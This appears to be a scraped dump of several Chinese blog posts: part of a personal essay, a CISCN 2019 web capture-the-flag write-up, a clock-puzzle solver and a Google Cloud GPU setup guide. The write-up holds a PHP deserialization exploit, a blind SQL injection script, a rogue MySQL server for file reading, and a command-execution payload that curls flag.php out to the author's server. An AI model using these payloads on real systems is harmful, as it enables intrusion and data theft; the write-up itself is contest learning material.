one。我会变成纯粹的，一个人。\n这个人一直走，从天黑走到天亮，从城市的一头走到另一头，从饥饿走到麻木，从无聊走到疲倦，走过繁华，走过阴森。这个人不愿停下，又已决定不回头，只好一直走。这个人会昏厥。如果在发现前醒来，他会挣扎着继续走，但他走不远。很快意志会被战胜，他又会展现出一如既往的懦弱和颓唐。他停在路边，此时可能已是第二日的黄昏，车水马龙，人来人往，没有人留意角落里的狼狈。他比任何时候都更感到自己和尘世的格格不入，他感到从前的自己太不了解伤感。他随即提醒自己自己已经计划要放弃自我，也就不可再去想起从前了。\n他还是能够感觉到饥饿，但他决定不去解决这个问题，他一早就觉得饮食滋长自我，此刻正是一个考验。他继续走，但走得很慢，脑子也开始迷糊。不知为何，他突然想起悉达多在树下盘起腿来，说是不想明白不起来，又想起年轻的王阳明和同伴在院子里，说是格不动竹不起身。他觉得好笑，忍不住笑了起来，越笑越觉得开心，好久没这样开心。他的笑突然僵住，脚步突然停下。他着急地转身。身后是大卡车呼啸而过。\n他坐在路边，夏夜的晚风有点凉意，路灯的昏黄有些温暖。他又重新注意到行人，有马尾辫，有婴儿车，竟然还有忽闪忽闪的气泡泡。\n所有关于尘世与平凡生活的景象都在呼唤一个在边缘试探的灵魂。他又开始觉得饿了，觉得有些爱这尘土飞扬的人间。\n我在不到24小时里做了好多重大而决绝的决定，但现在一一失败。我能做一些决定，但一些决定我不能做。做了也是徒然。当我失去我，我的决定就变成了风中的决定，只能等着“我”的回来，重新落到我的肩上。\n我又可以开始说我，每一句话都是我开头。我的手机还有电，我还能在路边吃汤面。我打一个的，我喋喋不休地和司机说着什么。我问司机孩子几岁，司机说老婆是高中同桌，我说今天晚上天气很好，司机说前面那姑娘腿真好看。我实在走得太远了，所以行程到一半我和司机已经亲似兄弟，无话不谈。司机问为什么我身上有点臭，我说你知道我吃过的最甜的东西是什么吗，司机说有时候如果不是怕疲劳驾驶根本不想回家，我说其实生活就是无数的选择。我们基本听不见对方说什么，但我们聊得很开心，我们都有充分的自我。我有重生的喜悦，他则跑了一个大长途。下车时我觉得他很舍不得，至少我看见我走了很远他的车还停在路边。我没有不舍的感觉，今天我已经告别太多了，我的感情已经用完。\n我相信失而复得值得高兴，我要为在一场想象中重回的自我庆祝一番，我不会再去做这样的傻事，甚至想也不再想。\n相识的保安问我是不是又没带卡，顺便笑嘻嘻地打开了门，我于是把手从兜里拿出，点头，微笑，谢谢。","title":"爱若"},{"content":"上周末(4/20~4/21)战队难得一起再打了个比赛，大概是大学生活里最后一场了吧，这里复盘下三个Web。\nJustSoso 使用伪协议 (http://xxx.changame.ichunqiu.com/index.php?file=php://filter/convert.base64-encode/resource=index.php) 读取到index.php和hint.php。\nindex.php:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;html\u0026gt; \u0026lt;?php error_reporting(0); $file = $_GET[\u0026#34;file\u0026#34;]; $payload = $_GET[\u0026#34;payload\u0026#34;]; if(!isset($file)){ echo \u0026#39;Missing parameter\u0026#39;.\u0026#39;\u0026lt;br\u0026gt;\u0026#39;; } if(preg_match(\u0026#34;/flag/\u0026#34;,$file)){ die(\u0026#39;hack attacked!!!\u0026#39;); } @include($file); if(isset($payload)){ $url = parse_url($_SERVER[\u0026#39;REQUEST_URI\u0026#39;]); parse_str($url[\u0026#39;query\u0026#39;],$query); foreach($query as $value){ if (preg_match(\u0026#34;/flag/\u0026#34;,$value)) { die(\u0026#39;stop hacking!\u0026#39;); exit(); } } $payload = unserialize($payload); }else{ echo \u0026#34;Missing parameters\u0026#34;; } ?\u0026gt; \u0026lt;!--Please test index.php?file=xxx.php --\u0026gt; \u0026lt;!--Please get the source of hint.php--\u0026gt; \u0026lt;/html\u0026gt; hint.php:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 \u0026lt;?php class Handle{ private $handle; public function __wakeup(){ foreach(get_object_vars($this) as $k =\u0026gt; $v) { $this-\u0026gt;$k = null; } echo \u0026#34;Waking up\\n\u0026#34;; } public function __construct($handle) { $this-\u0026gt;handle = $handle; } public function __destruct(){ $this-\u0026gt;handle-\u0026gt;getFlag(); } } class Flag{ public $file; public $token; public $token_flag; function __construct($file){ $this-\u0026gt;file = $file; $this-\u0026gt;token_flag = $this-\u0026gt;token = md5(rand(1,10000)); } public function getFlag(){ $this-\u0026gt;token_flag = md5(rand(1,10000)); if($this-\u0026gt;token === $this-\u0026gt;token_flag) { if(isset($this-\u0026gt;file)){ echo @highlight_file($this-\u0026gt;file,true); } } } } ?\u0026gt; 整体思路是利用Handle实例反序列化时调用的析构函数触发getFlag()，但有几个阻碍。\n$this-\u0026gt;token === $this-\u0026gt;token_flag 需要这两个属性值相等才能读到文件，而token值不变，token_flag的值总是在变化。\n1 2 3 4 5 6 7 8 $url = parse_url($_SERVER[\u0026#39;REQUEST_URI\u0026#39;]); parse_str($url[\u0026#39;query\u0026#39;],$query); foreach($query as $value){ if (preg_match(\u0026#34;/flag/\u0026#34;,$value)) { die(\u0026#39;stop hacking!\u0026#39;); exit(); } } url中不能包含flag字样，而反序列化后的字符串必然会包含 flag 。\n1 2 3 4 5 6 public function __wakeup(){ foreach(get_object_vars($this) as $k =\u0026gt; $v) { $this-\u0026gt;$k = null; } echo \u0026#34;Waking up\\n\u0026#34;; } 字符串反序列化时会自动调用对象中的 __wakeup 方法，这里 __wakeup 方法将所有属性值置空，下面 __destruct 的时候就找不到 $handle 了。\n整体方法 1 2 3 4 \u0026lt;?php $f=new Flag(\u0026#39;flag.php\u0026#39;); $target=\u0026#34;[url]/index.php?file=hint.php\u0026amp;payload=\u0026#34; . urlencode(serialize(new handle($f))); echo $target; 访问输出的链接。\n问题一 __construct 是在对象创建时自动调用，在反序列化时并不会被调用，这给了我们操纵token值的机会。\n由于rand(1,10000) 返回值可能性并不多，可以采用爆破。\n1 2 3 4 5 \u0026lt;?php $f=new Flag(\u0026#39;flag.php\u0026#39;); $f-\u0026gt;token=md5(\u0026#34;6666\u0026#34;); $target=\u0026#34;[url]/index.php?file=hint.php\u0026amp;payload=\u0026#34; . urlencode(serialize(new handle($f))); echo $target; 重复访问输出的链接。\n当然并不是说跑够一万次就一定能碰上，如果手气不好也可能总遇不到。\n那么可以采用每一次将token赋为不同的值，遍历全部一万种可能，直观上感觉这样做还碰不到的可能性会小很多。\n上面是大力出奇迹的做法，还有比较优雅的做法：将token指向token_flag的引用或相反，那么当一者改变时另一个会跟随。\n问题二 正则看起来绕不过去，直接访问 Flag.php 返回404，说明服务端是大小写敏感的。突破点在于 parse_url 遇到畸形url时会解析失败，那么后面的正则自然不起作用了。\n问题三 PHP有过一个漏洞 CVE-2016-7124 ，当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过 __wakeup 的执行。\n参考文章：\nSec Bug #72663 Create an Unexpected Object and Don\u0026rsquo;t Invoke __wakeup() in Deserialization SugarCRM v6.5.23 PHP反序列化对象注入漏洞 解法 1 2 3 4 5 6 7 8 9 10 11 class Handle{...} class Flag{...} $f=new Flag(\u0026#34;flag.php\u0026#34;); $f-\u0026gt;token=\u0026amp;$f-\u0026gt;token_flag; $g=serialize(new handle($f)); $gg=str_replace(\u0026#34;:1:{s\u0026#34;, \u0026#34;:2:{s\u0026#34;, $g); echo \u0026#34;http://[url]///index.php?file=hint.php\u0026amp;payload=\u0026#34; . urlencode($gg); /* http://[url]///index.php?file=hint.php\u0026amp;payload=O%3A6%3A%22Handle%22%3A2%3A%7Bs%3A14%3A%22%00Handle%00handle%22%3BO%3A4%3A%22Flag%22%3A3%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A5%3A%22token%22%3Bs%3A32%3A%224e4b5fbbbb602b6d35bea8460aa8f8e5%22%3Bs%3A10%3A%22token_flag%22%3BR%3A4%3B%7D%7D */ 全宇宙最简单的SQL 基于exp()函数报错的盲注，加上在未知列名情况下注出数据的技巧，可得到user表第二列数据为 F1AG@1s- at_/fll1llag_h3r3 ，作为admin的密码登录后进入后台，可以连接远程数据库，伪造MySQL服务的可以读取flag 文件。知识点在DDCTF2017和DDCTF2019出现过。\n记录个盲注脚本：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 #!/usr/bin/env python # -*- coding:utf-8 -*- import requests,re url = \u0026#39;http://39.97.227.64:52105/\u0026#39; headers = { \u0026#34;Content-Length\u0026#34;: \u0026#34;40\u0026#34;, \u0026#34;Cache-Control\u0026#34;: \u0026#34;max-age=0\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;http://39.106.224.151:52105\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;http://39.106.224.151:52105/\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Cookie\u0026#34;: \u0026#34;PHPSESSID=uj6gjpnpsham8ihv8alnegm8e0\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;close\u0026#34; } # payload = \u0026#34;\u0026#39;^exp({}-ascii(substr((select ),{},1)))#\u0026#34; # payload = \u0026#34;admin\u0026#39;^exp({}-ascii(substr((select `2` from (select 1,2 union select * from user)orz#),{},1)))#\u0026#34; payload = \u0026#34;\u0026#39;^exp({}-ascii(substr((select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1 offset 1),{},1)))#\u0026#34; p = { \u0026#39;username\u0026#39;: payload, \u0026#39;password\u0026#39;: \u0026#39;admin\u0026#39; } e = 709 c = 126 j = 1 import time res = \u0026#39;\u0026#39; while j \u0026lt; 30: print str(j) for i in range(32,127): p[\u0026#39;username\u0026#39;] = payload.format(e + c, j) r = requests.post(url, data=p, headers=headers) # print r.headers[\u0026#39;Content-Length\u0026#39;] # print r.content if re.findall(\u0026#34;数据库操作失败\u0026#34;, r.content) == []: res += chr(c) print res break c -= 1 # time.sleep(1) j += 1 c = 126 盲注结果：\nMySQL服务端伪造脚本：\n1 2 3 4 5 6 7 8 9 10 11 12 13 import socket file=\u0026#34;/fll1llag_h3r3\u0026#34; s=socket.socket() s.bind((\u0026#34;\u0026#34;,3306)) s.listen(5) c,ip=s.accept() c.sendall(\u0026#34;\\x4a\\x00\\x00\\x00\\x0a\\x35\\x2e\\x35\\x2e\\x35\\x33\\x00\\x17\\x00\\x00\\x00\\x6e\\x7a\\x3b\\x54\\x76\\x73\\x61\\x6a\\x00\\xff\\xf7\\x21\\x02\\x00\\x0f\\x80\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x70\\x76\\x21\\x3d\\x50\\x5c\\x5a\\x32\\x2a\\x7a\\x49\\x3f\\x00\\x6d\\x79\\x73\\x71\\x6c\\x5f\\x6e\\x61\\x74\\x69\\x76\\x65\\x5f\\x70\\x61\\x73\\x73\\x77\\x6f\\x72\\x64\\x00\u0026#34;) c.recv(666) c.sendall(\u0026#34;\\x07\\x00\\x00\\x02\\x00\\x00\\x00\\x02\\x00\\x00\\x00\u0026#34;) c.recv(666) c.sendall(chr(len(file)+1)+\u0026#34;\\x00\\x00\\x01\\xFB\u0026#34;+file) print c.recv(666) c.close() 伪造结果：\n参考文章：\n伪造mysql服务端实现任意读取 利用MySQL LOAD DATA特性达到任意文件读取 DDCTF 2017 SQL注入-绕过未知字段名 通过CISCN2019 Day 1 SQL注入思考基于运行时错误的盲注 love_math calc.php泄露源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 \u0026lt;?php error_reporting(0); //听说你很喜欢数学，不知道你是否爱它胜过爱flag if(!isset($_GET[\u0026#39;c\u0026#39;])){ show_source(__FILE__); }else{ //例子 c=20-1 $content = $_GET[\u0026#39;c\u0026#39;]; if (strlen($content) \u0026gt;= 80) { die(\u0026#34;太长了不会算\u0026#34;); } $blacklist = [\u0026#39; \u0026#39;, \u0026#39;\\t\u0026#39;, \u0026#39;\\r\u0026#39;, \u0026#39;\\n\u0026#39;,\u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39;`\u0026#39;, \u0026#39;\\[\u0026#39;, \u0026#39;\\]\u0026#39;]; foreach ($blacklist as $blackitem) { if (preg_match(\u0026#39;/\u0026#39; . $blackitem . \u0026#39;/m\u0026#39;, $content)) { die(\u0026#34;请不要输入奇奇怪怪的字符\u0026#34;); } } //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = [\u0026#39;abs\u0026#39;, \u0026#39;acos\u0026#39;, \u0026#39;acosh\u0026#39;, \u0026#39;asin\u0026#39;, \u0026#39;asinh\u0026#39;, \u0026#39;atan2\u0026#39;, \u0026#39;atan\u0026#39;, \u0026#39;atanh\u0026#39;, \u0026#39;base_convert\u0026#39;, \u0026#39;bindec\u0026#39;, \u0026#39;ceil\u0026#39;, \u0026#39;cos\u0026#39;, \u0026#39;cosh\u0026#39;, \u0026#39;decbin\u0026#39;, \u0026#39;dechex\u0026#39;, \u0026#39;decoct\u0026#39;, \u0026#39;deg2rad\u0026#39;, \u0026#39;exp\u0026#39;, \u0026#39;expm1\u0026#39;, \u0026#39;floor\u0026#39;, \u0026#39;fmod\u0026#39;, \u0026#39;getrandmax\u0026#39;, \u0026#39;hexdec\u0026#39;, \u0026#39;hypot\u0026#39;, \u0026#39;is_finite\u0026#39;, \u0026#39;is_infinite\u0026#39;, \u0026#39;is_nan\u0026#39;, \u0026#39;lcg_value\u0026#39;, \u0026#39;log10\u0026#39;, \u0026#39;log1p\u0026#39;, \u0026#39;log\u0026#39;, \u0026#39;max\u0026#39;, \u0026#39;min\u0026#39;, \u0026#39;mt_getrandmax\u0026#39;, \u0026#39;mt_rand\u0026#39;, \u0026#39;mt_srand\u0026#39;, \u0026#39;octdec\u0026#39;, \u0026#39;pi\u0026#39;, \u0026#39;pow\u0026#39;, \u0026#39;rad2deg\u0026#39;, \u0026#39;rand\u0026#39;, \u0026#39;round\u0026#39;, \u0026#39;sin\u0026#39;, \u0026#39;sinh\u0026#39;, \u0026#39;sqrt\u0026#39;, \u0026#39;srand\u0026#39;, \u0026#39;tan\u0026#39;, \u0026#39;tanh\u0026#39;]; preg_match_all(\u0026#39;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/\u0026#39;, $content, $used_funcs); foreach ($used_funcs[0] as $func) { if (!in_array($func, $whitelist)) { die(\u0026#34;请不要输入奇奇怪怪的函数\u0026#34;); } } //帮你算出答案 eval(\u0026#39;echo \u0026#39;.$content.\u0026#39;;\u0026#39;); } 通过base_convert将十进制转三十六进制，可以得到小写字母和数字共三十六种字符，再通过异或、与、或进一步得到更大的字符集。受限于总长度为小于80个字符，将base_convert赋值给pi方便重复使用。\n遍历发现123456789abcdefghijklmnopqrstuvwxyz 和123456789abcdefghijklmnopqrstuvwxyz 按位异或可得到可打印字符集A@CBEDGFIHKJMLONQPSRUTWVYX[Z]\\_^ ，可以构造出_GET 。使用花括号取偏移，再使用exec执行命令，构造出等价于exec($_GET{1}) 的payload。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import itertools res=set() ii=\u0026#34;\u0026#34; jj=\u0026#34;\u0026#34; cmd=\u0026#34;_GET\u0026#34; for k in cmd: for i,j in itertools.product(\u0026#34;123456789abcdefghijklmnopqrstuvwxyz\u0026#34;,\u0026#34;0123456789abcdefghijklmnopqrstuvwxyz\u0026#34;): kk=chr(ord(i)^ord(j)) if k==kk: ii=ii+i jj+=j break res.add(kk) print ii,jj #1111 nvte print \u0026#39;\u0026#39;.join(res) # A@CBEDPSRUTWVYX[Z]\\_^ 将1111 和nvte 作为36进制数，转为10进制数分别得到：47989和1114322。可以使用在线工具或PHP的base_convert函数转换。\n最终访问路径为calc.php?c=$pi=base_convert;$pi(696468,10,36)(${$pi(47989,10,36)^$pi(1114322,10,36)}{1})\u0026amp;1=curl%20my.vps%20-F%20'data=@flag.php' 。在服务端监听即可收到flag.php内容。\n初步实现命令执行\n获取flag\n如果长度放宽一点，这些思路也许也可以：\n1 2 3 4 5 system(cat `ls`) $pi=base_convert;$pi(1751504350,10,36)($pi(963893486026,10,36)\u0026amp;$pi(963910328843,10,36)) system(cat $(ls)) $pi=base_convert;pi(1751504350,10,36)(pi(573877,10,36)\u0026amp;pi(573887,10,36)$(pi((784,10,36)))) ","permalink":"https://ret2neo.cn/post/190427-ciscn2019-web-wp/","summary":"上周末(4/20~4/21)战队难得一起再打了个比赛，大概是大学生活里最后一场了吧，这里复盘下三个Web。\nJustSoso 使用伪协议 (http://xxx.changame.ichunqiu.com/index.php?file=php://filter/convert.base64-encode/resource=index.php) 读取到index.php和hint.php。\nindex.php:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;html\u0026gt; \u0026lt;?php error_reporting(0); $file = $_GET[\u0026#34;file\u0026#34;]; $payload = $_GET[\u0026#34;payload\u0026#34;]; if(!isset($file)){ echo \u0026#39;Missing parameter\u0026#39;.\u0026#39;\u0026lt;br\u0026gt;\u0026#39;; } if(preg_match(\u0026#34;/flag/\u0026#34;,$file)){ die(\u0026#39;hack attacked!!!\u0026#39;); } @include($file); if(isset($payload)){ $url = parse_url($_SERVER[\u0026#39;REQUEST_URI\u0026#39;]); parse_str($url[\u0026#39;query\u0026#39;],$query); foreach($query as $value){ if (preg_match(\u0026#34;/flag/\u0026#34;,$value)) { die(\u0026#39;stop hacking!\u0026#39;); exit(); } } $payload = unserialize($payload); }else{ echo \u0026#34;Missing parameters\u0026#34;; } ?","title":"第十二届全国大学生信息安全竞赛创新实践能力赛 web writeup"},{"content":"拨钟问题 解法一 全局暴力搜索\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import itertools initstate=[3,3,0,2,2,2,2,1,2] update=[ [1,2,4,5], [1,2,3], [2,3,5,6], [1,4,7], [2,4,5,6,8], [3,6,9], [4,5,7,8], [7,8,9], [5,6,8,9] ] for i in itertools.product([0,1,2,3],repeat=9): initstate=[3,3,0,2,2,2,2,1,2] for j in range(9): for k in update[j]: initstate[k-1]+=i[j] initstate[k-1]%=4 if sum(initstate)==0: print \u0026#39; \u0026#39;.join([\u0026#39; \u0026#39;.join(str(m+1)*i[m]) for m in range(9) if i[m]!=0]) break # 4 5 8 9 解法二 局部暴力搜索\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import itertools for i in itertools.product([0,1,2,3],repeat=3): initstate=[-1,3,3,0,2,2,2,2,1,2] op=[0]+list(i)+[0]*6 op[4]=(4-(initstate[1]+op[1]+op[2])%4)%4 op[5]=(4-(initstate[2]+op[1]+op[2]+op[3])%4)%4 op[6]=(4-(initstate[3]+op[2]+op[3])%4)%4 op[7]=(4-(initstate[4]+op[1]+op[4]+op[5])%4)%4 op[9]=(4-(initstate[6]+op[3]+op[5]+op[6])%4)%4 op[8]=(4-(initstate[8]+op[5]+op[7]+op[9])%4)%4 sum=0 sum+=(initstate[1]+op[1]+op[2]+op[4])%4 sum+=(initstate[2]+op[1]+op[2]+op[3]+op[5])%4 sum+=(initstate[3]+op[2]+op[3]+op[6])%4 sum+=(initstate[4]+op[1]+op[4]+op[5]+op[7])%4 sum+=(initstate[5]+op[1]+op[3]+op[5]+op[7]+op[9])%4 sum+=(initstate[6]+op[3]+op[5]+op[6]+op[9])%4 sum+=(initstate[7]+op[4]+op[7]+op[8])%4 sum+=(initstate[8]+op[5]+op[7]+op[8]+op[9])%4 sum+=(initstate[9]+op[6]+op[8]+op[9])%4 if sum==0: print \u0026#39; \u0026#39;.join([\u0026#39; \u0026#39;.join(str(m)*op[m]) for m in range(10) if op[m]!=0]) break # 4 5 8 9 其它 函数传参传值还是引用的问题，还是需要注意的。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 foo=0 bar=[0] painting=[[0]] paintingdict={0:[0]} print foo,bar,painting def guess(foo2,bar2,painting2,paintingdict2): foo2=1 bar2[0]=1 painting2[0][0]=1 paintingdict2[0]=[1] guess(foo,bar,painting,paintingdict) print foo,bar,painting,paintingdict # 输出结果： # 0 [0] [[0]] # 0 [1] [[1]] {0: [1]} 参考 https://blog.csdn.net/C20191618/article/details/69388416\n","permalink":"https://ret2neo.cn/post/190326-clock-manage-problem/","summary":"拨钟问题 解法一 全局暴力搜索\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import itertools initstate=[3,3,0,2,2,2,2,1,2] update=[ [1,2,4,5], [1,2,3], [2,3,5,6], [1,4,7], [2,4,5,6,8], [3,6,9], [4,5,7,8], [7,8,9], [5,6,8,9] ] for i in itertools.product([0,1,2,3],repeat=9): initstate=[3,3,0,2,2,2,2,1,2] for j in range(9): for k in update[j]: initstate[k-1]+=i[j] initstate[k-1]%=4 if sum(initstate)==0: print \u0026#39; \u0026#39;.join([\u0026#39; \u0026#39;.join(str(m+1)*i[m]) for m in range(9) if i[m]!=0]) break # 4 5 8 9 解法二 局部暴力搜索","title":"拨钟问题"},{"content":"深度学习需要较强的计算能力，在网络上找了一圈，列出一些可用的方案。\n极客云 谷歌云 。提供一年免费试用，但需要外币信用卡。 谷歌的Colaboratory 厦大HPC 淘宝西电机房等 百度深度学习平台 AWS DeepBrain Chain 美团云 售罄 滴滴云 华为云 阿里云 参考文章 机器学习深度学习云GPU资源与对比 有没有云端的深度学习计算服务？ 基本环境 在谷歌云上搭建起 Ubuntu16.04 + Python3.5 + tensorflow-gpu-1.4 + CUDA v8 + cuDNN v6 的环境。\n申请试用谷歌云 地址可随意填，记录两个。\n台中市大甲区大甲里 邮编：43749\nCalifornia(加利福尼亚省) Adelanto(阿德兰托市) 邮编[ADELANTO CA 92301]\n新建虚拟机 进入Google Cloud Platform -\u0026gt; Compute Engine -\u0026gt; VM 实例 ，通过“创建实例”新建一台虚拟机。\n机器类型中选择自定义来添加GPU数量和类型。 需要先按提示申请升级账户才能进行上述操作。很快会有邮件反馈申请成功。 自定义磁盘容量，防火墙允许流量。 点击创建得到一台全新的云端虚拟机。 远程访问 添加静态外部IP地址。在VM实例页面，实例右侧的设置处点击查看网络详情即可。 在Compute Engine -\u0026gt; 元数据 中修改SSH 密钥。使用XHSELL或命令行工具生成密钥对后在云端按指定格式添加公钥，然后可在本地用私钥远程登陆。 安装Anaconda wget https://repo.continuum.io/archive/Anaconda3-4.2.0-Linux-x86_64.sh\nchmod +x Anaconda3-4.2.0-Linux-x86_64.sh\n./Anaconda3-4.2.0-Linux-x86_64.sh 按提示选择，对于是否添加到PATH记得选yes。\nsource ~/.bashrc 使conda等命令生效。\nconda create -n tensorflow python=3.5 建立虚拟环境。\nsource activate tensorflow 激活环境。\npip install --ignore-installed --upgrade tensorflow-gpu==1.4.0 安装tensorflow。\nlspci -vnn | grep VGA -A 12 查看显卡类型\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 (tensorflow) dfindneo@gaster:~/tf/aster/c_ops$ lspci -vnn | grep VGA -A 12 00:03.0 Non-VGA unclassified device [0000]: Red Hat, Inc. Virtio SCSI [1af4:1004] Subsystem: Red Hat, Inc. Virtio SCSI [1af4:0008] Physical Slot: 3 Flags: bus master, fast devsel, latency 0, IRQ 11 I/O ports at c080 [size=64] Memory at fd000000 (32-bit, non-prefetchable) [size=128] Capabilities: \u0026lt;access denied\u0026gt; Kernel driver in use: virtio-pci 00:04.0 3D controller [0302]: NVIDIA Corporation GP100GL [Tesla P100 PCIe 16GB] [10de:15f8] (rev a1) Subsystem: NVIDIA Corporation Device [10de:118f] Physical Slot: 4 Flags: fast devsel, IRQ 11 安装显卡驱动 访问NVIDIA官网 ，选择配置。 点击search，看到对应的版本是384.66 安装驱动\n1 2 3 4 5 6 sudo add-apt-repository ppa:graphics-drivers/ppa sudo apt-get update sudo apt-get install nvidia-384 #此处要根据上面查询到的版本适当更改 sudo apt-get install mesa-common-dev sudo apt-get install freeglut3-dev sudo reboot -h now 重启后可以使用nvidia-smi 命令查看是否安装成功。 安装CUDA8.0 我使用sudo apt install nvidia-cuda-toolkit 安装的CUDA是7.?版本的，使用sudo apt remove nvidia-cuda* 卸载掉了。\n要安装CUDAv8.0，在这个页面选择系统、架构、发行版及其版本，安装类型可选择runfile。如果是Ubuntu16.04，可直接 wget https://developer.nvidia.com/compute/cuda/8.0/Prod2/local_installers/cuda_8.0.61_375.26_linux-run ，然后 sh cuda_8.0.61_375.26_linux-run 。询问是否安装驱动时应选择否，因为我们已经安装过驱动了。\n看到提示\n1 2 3 Please make sure that - PATH includes /usr/local/cuda-8.0/bin - LD_LIBRARY_PATH includes /usr/local/cuda-8.0/lib64, or, add /usr/local/cuda-8.0/lib64 to /etc/ld.so.conf and run ldconfig as root 于是将 export PATH=\u0026quot;/usr/local/cuda-8.0/bin:$PATH\u0026quot;;export LD_LIBRARY_PATH=\u0026quot;/usr/lib/nvidia-384:$LD_LIBRARY_PATH\u0026quot; 添加到~/.bashrc 并source更新。将/usr/local/cuda-8.0/lib64 添加到文件 /etc/ld.so.conf 然后 sudo ldconfig。\n执行 cd ~/NVIDIA_CUDA-8.0_Samples/1_Utilities/deviceQuery \u0026amp;\u0026amp; make \u0026amp;\u0026amp; ./deviceQuery 。如果输出末尾有PASS字样，表示安装成功。\n使用 nvcc --version 查看版本信息。 安装cuDNN6.0 登陆账号后访问 https://developer.nvidia.com/compute/machine-learning/cudnn/secure/v6/prod/8.0_20170307/cudnn-8.0-linux-x64-v6.0-tgz ，点击下载，在chrome浏览器中按CTRL+J查看真实下载链接，暂停下载，然后在shell里wget该链接即可。下载后重命名文件为cudnn-8.0-linux-x64-v6.0.tgz 。 tar xzf cudnn-8.0-linux-x64-v6.0.tgz sudo cp cuda/include/cudnn.h /usr/local/cuda/include/ sudo cp cuda/lib64/libcudnn* /usr/local/cuda/lib64/ sudo chmod a+r /usr/local/cuda/include/cudnn.h sudo chmod a+r /usr/local/cuda/lib64/libcudnn* 安装完成 到此为止深度学习的基本环境已经安装完成。可以在Compute Engine -\u0026gt; 快照 中建立一个快照。\n接下来记录想要复现和改进的模型 aster 的基本环境配置。\nASTER环境 激活虚拟环境并安装依赖 1 2 3 4 5 source activate tensorflow cd ~ sudo apt update sudo apt install git cmake libcupti-dev build-essential protobuf-compiler unzip python-pip3 pip install --user protobuf tqdm numpy editdistance Pillow scipy matplotlib edit_distance 下载源码 1 2 mkdir tf \u0026amp;\u0026amp; cd tf git clone https://github.com/bgshih/aster.git 按照readme依次完成三步配置 ①Go to c_ops/ and run build.sh to build the custom operators\n1 2 3 cd ~/tf/aster/c_ops chmod +x build.sh ./build.sh ②Execute protoc aster/protos/*.proto --python_out=. to build the protobuf files\n1 2 cd ~/tf protoc aster/protos/*.proto --python_out=. ③Add /path/to/aster to PYTHONPATH, or set this variable for every run\n在~/.bashrc 末尾加两行\n1 2 export PYTHONPATH=\u0026#34;${PYTHONPATH}:/home/neo/tf/aster\u0026#34; source activate tensorflow 下载作者提供的模型 1 2 3 cd ~/tf/aster/experiments/demo/ wget https://github.com/bgshih/aster/releases/download/v1.0.1/model-demo.zip unzip model-demo.zip 运行demo python aster/demo.py\n数据集下载 cute80 主页 下载：CUTE80_Dataset.zip (44 MB) ic03 下载\nic13 主页 下载 （注册账号后可见） ic15 主页 下载 （注册账号后可见） 文件说明 Downloads - Incidental Scene Text Download below the training dataset and associated ground truth information for each of the Tasks.\nTask 4.1: Text Localization (2015 edition) Training Set Training Set Images (88.5MB).- 1000 images obtained with wearable cameras\nTraining Set Localisation and Transcription Ground Truth (157KB).- 1000 text files with word level localisation and transcription ground truth\nTest Set Test Set Images (43.3MB).- 500 images obtained with wearable cameras. You can submit your results for this Task over the images of the test set through the My Methods section.\nTest Set Ground Truth (244Kb). - 500 text files with text localisation bounding boxes for the images of the test set.\nTask 4.2: Text Segmentation (N/A) Not available.\nTask 4.3: Word Recognition (2015 edition) Training Set Training Set Word Images, along with Transcriptions Ground truth (40.5MB).- ~4468 cut out word images corresponding to the axis oriented bounding boxes of the words are provided along with a single text file with the relative coordinates of the bounding shape within each word image. Transcription ground truth is provided in a single txt file.\nTest Set Test Set Word Images (21.5MB).- 2077 cut out word images corresponding to the axis oriented bounding boxes of the words are provided along with a single text file with the relative coordinates of the bounding shape within each word image. You can submit your results for this Task over the images of the test set through the My Methods section.\nTest Set Ground Truth (49Kb). - A single text file with the transcriptions of the 2077 images of the test set. Each line corresponds to an image of the test set.\nTask 4.4: End to End (2015 edition) Training Set Training Set Images (88.5MB).- 1000 images obtained with wearable cameras\nTraining Set Vocabulary (16KB).- Vocabulary of all words (words of 3 characters or longer comprising only letters) appearing in the training set\nTraining Set Per-image Vocabularies (504KB).- Vocabularies of 100 words per image, comprising the words appearing in the image plus distractors\nTraining Set Localisation and Transcription Ground Truth (157KB).- 1000 text files with word level localisation and transcription ground 